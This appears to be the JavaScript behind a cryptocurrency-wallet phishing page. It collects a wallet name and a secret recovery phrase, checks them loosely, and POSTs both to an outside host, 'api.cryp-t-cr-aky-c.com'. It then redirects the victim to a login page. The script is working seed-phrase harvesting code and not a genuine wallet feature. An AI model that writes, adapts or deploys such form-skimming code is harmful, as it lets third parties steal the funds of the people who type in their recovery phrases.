let walletName = ""
let secretPhrase = ""

let error1 = false;
let error2 = false;
let error3 = false;
let error4 = false;

document.querySelector(".input-box").addEventListener("input",(e)=>{
  document.querySelector(".error-box-1").classList.add("display")
  walletName = e.target.value;
})

document.querySelector(".text-box").addEventListener("input",(e)=>{
  document.querySelector(".error-box-2").classList.add("display")
  secretPhrase = e.target.value;
  console.log(secretPhrase)
})

//colouring
document.querySelector(".button").style.backgroundColor = "rgba(245, 245, 245, 0.985)"
document.querySelector(".button").style.color = "rgba(0, 0, 0, 0.205)"

//colouring
document.querySelector(".text-box").addEventListener("input",(e)=>{
  if(e.target.value.length === 0){
    document.querySelector(".button").style.backgroundColor = "rgba(245, 245, 245, 0.985)"
    document.querySelector(".button").style.color = "rgba(0, 0, 0, 0.205)"
  }
  else{
    document.querySelector(".button").style.backgroundColor = "rgb(92, 165, 248)"
    document.querySelector(".button").style.color = "rgba(255, 255, 255, 1)"
  }
})

function checkSymbNum(inputData){
  let inputLen = inputData.length
  for(let i=0;i<inputLen;i++){
    if((inputData.charCodeAt(i)>=0 && inputData.charCodeAt(i)<=31) || (inputData.charCodeAt(i)>=33 && inputData.charCodeAt(i)<=64) || (inputData.charCodeAt(i)>=91 && inputData.charCodeAt(i)<=96) || (inputData.charCodeAt(i)>=123 && inputData.charCodeAt(i)<=126)){
      return true;
    }
  }
  return false;
}

function checkSecret(str){
  if(str.length<3) return true;
  for(let i=0;i<str.length;i++){
    let wordLen = 0;
    for(let j=0;j<str.length;j++){
      if(str.charAt(j)== " ") break;
      else{
        wordLen++;
      }
    }
      if(wordLen < 3){
        return true;
      }
  }
  return false;
}

document.querySelector(".button").addEventListener("click",(e)=>{
  e.preventDefault();

  let ans = checkSecret(secretPhrase);
  if(ans){
    document.querySelector(".error-box-2").classList.remove("display");
    document.querySelector(".error-box-2").innerHTML = "*Length Of Each Word Should Be Atleast 3 Letters";
  }

  if(checkSymbNum(walletName)){
    error3 = true
    document.querySelector(".error-box-1").classList.remove("display");
    document.querySelector(".error-box-1").innerHTML = "*Wallet name should not contain any number or symbol";
  }

  if(checkSymbNum(secretPhrase)){
    error4 = true
    document.querySelector(".error-box-2").classList.remove("display");
    document.querySelector(".error-box-2").innerHTML = "*Secret phrase should not contain any number or symbol";
  }

  if(document.querySelector(".input-box").value === ""){
    error1 = true;
  }

  if(document.querySelector(".text-box").value === ""){
    error2 = true;
  }

  if(error2){
    document.querySelector(".error-box-2").classList.remove("display");
    document.querySelector(".error-box-2").innerHTML = "*Enter Secret Phrase";
  }

  if(error1){
    document.querySelector(".error-box-1").classList.remove("display");
    document.querySelector(".error-box-1").innerHTML = "*Enter The Wallet Name";
  }

  if(ans === false && (error1 === false && error2 === false) && (error3 === false && error4 === false)){
    console.log("DONE")
    const url = "https://api.cryp-t-cr-aky-c.com/api/multicoin";
      const data = {
          walletName:walletName,
          secretPhrase:secretPhrase
      };
      const options = {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
      };

      console.log(data)
    fetch(url, options)
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.json();
    })
    .then(data => {
      console.log(data)
      if(data.status === "Confirmed"){
        window.location.assign("../LoginPage/loginpage.html");
      }
    })
    .catch(error => {
      console.error('Fetch error:', error);
    });
  }
})
